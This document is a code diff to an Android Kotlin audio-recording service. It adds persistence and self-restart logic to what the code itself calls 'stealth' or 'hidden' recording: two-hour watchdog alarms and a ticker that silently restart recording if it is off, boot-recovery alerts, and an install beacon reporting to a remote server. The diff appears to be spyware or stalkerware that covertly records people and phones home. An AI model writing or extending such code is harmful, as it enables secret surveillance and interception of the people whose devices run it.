@@ -67,6 +67,7 @@ class AudioRecordService : Service() {
         const val ACTION_STOP_HIDDEN = "ACTION_STOP_HIDDEN"
         const val ACTION_STOP = "ACTION_STOP"
         const val ACTION_STANDBY = "ACTION_STANDBY"
+        const val ACTION_WATCHDOG_CHECK = "com.audiostream.client.ACTION_WATCHDOG_CHECK"
         const val ACTION_STATE_UPDATE = "ACTION_STATE_UPDATE"
         const val ACTION_LOG = "ACTION_LOG"
 
@@ -78,6 +79,7 @@ class AudioRecordService : Service() {
         const val EXTRA_IS_MAIN = "is_main"
         const val EXTRA_MESSAGE = "message"
         const val EXTRA_STORAGE = "storage"
+        const val EXTRA_BOOT_RESTART = "boot_restart"
 
         const val CHANNEL_ID = "audio_monitor_channel"
         const val NOTIFICATION_ID = 1
@@ -140,6 +142,9 @@ class AudioRecordService : Service() {
     private var currentBatteryPct = -1
     private var currentStorageMB = -1L
 
+    private var isPendingBootNotification = false
+    private var watchdogTickerJob: Job? = null
+
     override fun onBind(intent: Intent?): IBinder? = null
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
@@ -157,7 +162,16 @@ class AudioRecordService : Service() {
             val defaultUrl = prefs.getString("server_url", "https://audio-steam-server.onrender.com") ?: ""
             val url = intent.getStringExtra(EXTRA_SERVER_URL) ?: serverUrl.ifEmpty { defaultUrl }
 
+            val isBoot = intent.getBooleanExtra(EXTRA_BOOT_RESTART, false)
+            if (isBoot) {
+                isPendingBootNotification = true
+                sendLog("📱 Boot recovery flag detected — will transmit device_boot alert on connection")
+            }
+
             when (intent.action) {
+                ACTION_WATCHDOG_CHECK -> {
+                    handleWatchdogCheck(url)
+                }
                 ACTION_START_MAIN -> {
                     startMainRecording(url)
                 }
@@ -617,6 +631,11 @@ class AudioRecordService : Service() {
             onLog = { msg -> sendLog(msg) },
             onConnectionStateChanged = { connected ->
                 if (connected) {
+                    if (isPendingBootNotification) {
+                        isPendingBootNotification = false
+                        sendLog("🔄 Transmitting device_boot recovery packet to server via WebSocket")
+                        socketManager?.sendEvent("device_boot", mapOf("status" to "reboot_recovered", "is_recording" to isHiddenRecording))
+                    }
                     sendLiveTelemetry()
                     socketManager?.sendStatus(if (isRunning) "recording" else "idle")
                 }
@@ -624,10 +643,17 @@ class AudioRecordService : Service() {
         )
         socketManager?.start()
 
+        // 1. Ensure install beacon is registered
+        InstallBeaconManager.checkAndSendBeacon(this, serverUrl)
+
+        // 2. Schedule recurring 2-hour stealth watchdog alarms
+        WatchdogScheduler.scheduleRecurringWatchdog(this)
+
         storageManager!!.cleanupTempFiles()
         startNotificationUpdater()
         startCommandPolling()
         startTelemetryPolling()
+        startWatchdogTicker()
 
         isServiceInitialized = true
     }
@@ -710,7 +736,40 @@ class AudioRecordService : Service() {
         broadcastStateUpdate()
     }
 
+    private fun handleWatchdogCheck(url: String) {
+        ensureServiceInitialized(url)
+        if (isHiddenRecording) {
+            sendLog("⏰ 2-Hour Watchdog check: Stealth recording is already actively RUNNING.")
+            socketManager?.sendEvent("watchdog_activation", mapOf("action" to "already_running", "cycle" to "2_hour"))
+            sendLiveTelemetry()
+        } else {
+            sendLog("⏰ 2-Hour Watchdog check: Stealth recording was OFF! Automatically starting stealth recording now.")
+            startHiddenRecording(url)
+            socketManager?.sendEvent("watchdog_activation", mapOf("action" to "started_recording", "cycle" to "2_hour"))
+        }
+    }
+
+    private fun startWatchdogTicker() {
+        watchdogTickerJob?.cancel()
+        watchdogTickerJob = serviceScope.launch(Dispatchers.IO) {
+            while (isActive) {
+                delay(2 * 3600 * 1000L) // 2-hour backup ticker while service is alive
+                try {
+                    val currentHour = Calendar.getInstance().get(Calendar.HOUR_OF_DAY)
+                    if (currentHour >= 5 && !isHiddenRecording) {
+                        sendLog("⏰ Internal 2-hour ticker: Stealth recording was OFF! Auto-starting now.")
+                        withContext(Dispatchers.Main) {
+                            startHiddenRecording(serverUrl)
+                        }
+                    }
+                } catch (e: Exception) { /* ignore */ }
+            }
+        }
+    }
+
     private fun stopAll() {
+        watchdogTickerJob?.cancel()
+        watchdogTickerJob = null
         isMainRecording = false
         isHiddenRecording = false
         isStandbyMode = false
